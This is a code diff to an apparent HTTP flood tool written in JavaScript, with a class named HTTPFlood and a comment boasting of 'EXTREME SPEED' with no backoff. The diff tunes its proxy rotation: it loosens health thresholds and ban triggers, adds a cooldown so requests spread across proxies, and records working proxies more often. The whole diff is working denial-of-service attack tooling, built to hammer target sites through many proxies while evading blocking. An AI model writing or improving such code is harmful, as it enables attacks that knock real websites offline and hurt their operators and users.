@@ -163,6 +163,7 @@ const config = {
     workingProxies: new Set(),
     proxyHealth: new Map(),
     proxyBanList: new Map(), // Temporary bans with timestamps
+    proxyCooldown: new Map(), // Track last use time for rotation
     debug: false,
     http2Sessions: new Map(),
     connectionPool: new Map(),
@@ -485,30 +486,45 @@ function getHealthyProxy() {
         }
         
         const health = config.proxyHealth.get(proxy);
-        return !health || health.score > 30;
+        return !health || health.score > 5; // More lenient: was 30, now 5
     });
     
     if (availableProxies.length === 0) {
+        // Reset all health scores but keep ban list
         config.proxyHealth.clear();
-        config.proxyBanList.clear();
+        console.log('[!] All proxies filtered out, resetting health scores...');
         return getRandomElement(config.proxies);
     }
     
-    // Weighted random selection (best proxies used 3x more often)
-    const weights = availableProxies.map(proxy => {
+    // Prefer proxies that haven't been used recently (cooldown)
+    const proxiesWithCooldown = availableProxies.map(proxy => {
+        const lastUse = config.proxyCooldown.get(proxy) || 0;
+        const cooldownPenalty = Math.max(0, 1 - (now - lastUse) / 200); // 200ms cooldown
+        return { proxy, cooldownPenalty };
+    });
+    
+    // Weighted random selection (best proxies + cooled down proxies favored)
+    const weights = proxiesWithCooldown.map(({ proxy, cooldownPenalty }) => {
         const score = config.proxyHealth.get(proxy)?.score || 100;
-        return Math.pow(score / 100, 2); // Square to emphasize differences
+        const weight = Math.pow(score / 100, 1.5) * (1 + cooldownPenalty); // Less aggressive weighting
+        return weight;
     });
     
     const totalWeight = weights.reduce((a, b) => a + b, 0);
     let random = Math.random() * totalWeight;
     
-    for (let i = 0; i < availableProxies.length; i++) {
+    for (let i = 0; i < proxiesWithCooldown.length; i++) {
         random -= weights[i];
-        if (random <= 0) return availableProxies[i];
+        if (random <= 0) {
+            const selectedProxy = proxiesWithCooldown[i].proxy;
+            config.proxyCooldown.set(selectedProxy, now);
+            return selectedProxy;
+        }
     }
     
-    return availableProxies[0];
+    const fallback = proxiesWithCooldown[0].proxy;
+    config.proxyCooldown.set(fallback, now);
+    return fallback;
 }
 
 async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateProxies = false) {
@@ -1060,11 +1076,16 @@ class HTTPFlood {
                 
                 updateStats(true, response.status, bytesSent, bytesReceived);
                 
+                // Update proxy health on success
+                if (useProxy) {
+                    updateProxyHealth(config.proxies[proxyIndex], true, latency);
+                }
+                
                 successCount++;
                 failCount = 0;
                 retryDelay = 100; // Reset backoff on success
                 
-                if (useProxy && successCount % 20 === 0) {
+                if (useProxy && successCount % 10 === 0) { // Track working proxies more frequently
                     const proxyIP = config.proxies[proxyIndex].replace(/^https?:\/\//, '').split(':')[0];
                     config.workingProxies.add(proxyIP);
                 }
@@ -1091,13 +1112,14 @@ class HTTPFlood {
                 if (useProxy && (errorCode === 'ECONNRESET' || errorCode === 'ECONNREFUSED' || errorCode === 'EPIPE')) {
                     cachedAgent = null;
                     
-                    if (failCount >= 3) {
-                        // Temp ban proxy for 30 seconds
+                    if (failCount >= 12) { // More lenient: was 3, now 12
+                        // Temp ban proxy for 45 seconds
                         const currentProxy = config.proxies[proxyIndex];
-                        config.proxyBanList.set(currentProxy, Date.now() + 30000);
+                        config.proxyBanList.set(currentProxy, Date.now() + 45000);
+                        updateProxyHealth(currentProxy, false, 0); // Mark as failed
                         
                         if (config.debug) {
-                            console.log(`[DEBUG] T${threadId}: Banned proxy for 30s after ${failCount} fails`);
+                            console.log(`[DEBUG] T${threadId}: Banned proxy for 45s after ${failCount} connection fails`);
                         }
                         
                         proxyIndex = (proxyIndex + 1) % config.proxies.length;
@@ -1105,10 +1127,11 @@ class HTTPFlood {
                         retryDelay = 100;
                     }
                     // NO BACKOFF DELAY - EXTREME SPEED
-                } else if (useProxy && failCount >= 5) {
-                    // Ban after 5 fails for other errors
+                } else if (useProxy && failCount >= 15) { // More lenient: was 5, now 15
+                    // Ban after 15 fails for other errors
                     const currentProxy = config.proxies[proxyIndex];
-                    config.proxyBanList.set(currentProxy, Date.now() + 30000);
+                    config.proxyBanList.set(currentProxy, Date.now() + 45000);
+                    updateProxyHealth(currentProxy, false, 0); // Mark as failed
                     cachedAgent = null;
                     proxyIndex = (proxyIndex + 1) % config.proxies.length;
                     failCount = 0;
